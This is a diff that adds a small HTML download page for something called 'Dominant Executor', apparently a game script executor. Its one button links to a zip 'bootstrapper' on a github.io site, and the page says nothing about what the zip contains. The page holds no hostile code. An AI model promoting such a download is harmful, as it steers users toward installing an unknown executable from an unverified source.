@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dominant Executor</title>
+    <style>
+        body {
+            background-color: #111;
+            color: white;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        h1 {
+            margin-top: 20px;
+        }
+        .download-button {
+            display: inline-block;
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+            background: linear-gradient(to bottom, #007bff, #0056b3);
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .download-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        }
+        .rotating-image {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            animation: rotate 3s linear infinite;
+        }
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Dominant Executor!</h1>
+    <a class="download-button" href="https://requiremodulescript.github.io/bootstrapper/dominantbootstrapper.zip" download>Download!</a>
+
+    <script>
+        const corners = [
+            { top: "10px", left: "10px" },
+            { top: "10px", right: "10px" },
+            { bottom: "10px", left: "10px" },
+            { bottom: "10px", right: "10px" }
+        ];
+
+        corners.forEach(pos => {
+            let img = document.createElement("img");
+            img.src = "139336001646889.png";
+            img.className = "rotating-image";
+            Object.assign(img.style, pos);
+            document.body.appendChild(img);
+        });
+    </script>
+
+</body>
+</html>
